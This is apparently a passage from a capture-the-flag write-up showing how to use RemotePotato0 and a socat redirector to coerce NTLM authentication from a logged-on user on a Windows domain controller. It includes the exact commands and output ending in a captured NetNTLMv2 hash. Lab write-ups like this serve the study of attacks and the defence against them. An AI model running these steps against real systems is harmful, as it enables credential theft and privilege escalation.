If you saw another user that having a session on the computer right now  with you `qwinsta`, use this to coarce NTMLv2. THIS WORK EVEN IF NTLMv2 disabled.
```powershell
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe x x qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active

```
there are 2 ways for doing it:
- RemotePotato0
- KrbRelay
#### RemotePotato0

`RemotePotato0` is a tool that:
> It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.

To run it, I’ll use the following options:
- `-m 2` - method 2, “Rpc capture (hash) server + potato trigger”
- `-s 1` - the session of the user to target
- `-x 10.10.14.6` - set the rogue Oxid resolver IP to mine
- `-p 9999` - the port I’ll relay back to the host; not necessary since this is default, but good to explicitly state

These kind of RPC connections will only target TCP 135. Since I can’t listen on TCP 135 on Rebound (it’s already listening with the legit RPC service), I’ll have the exploit target my host, and then forward that back to `RemotePotato0` on 9999. I’ll run `socat` on my box `sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999`. So the traffic will hit my host on 135 and go back to Rebound on 9999, where `RemotePotato0` is listening.

When I run this, it dumps a NetNTMLv2 hash for TBrady:
```
*Evil-WinRM* PS C:\programdata> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.6 -p 9999

[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:2c38764642ea2aeb:216c7642dd3e5224eed40910c4aff73f:010100000000

```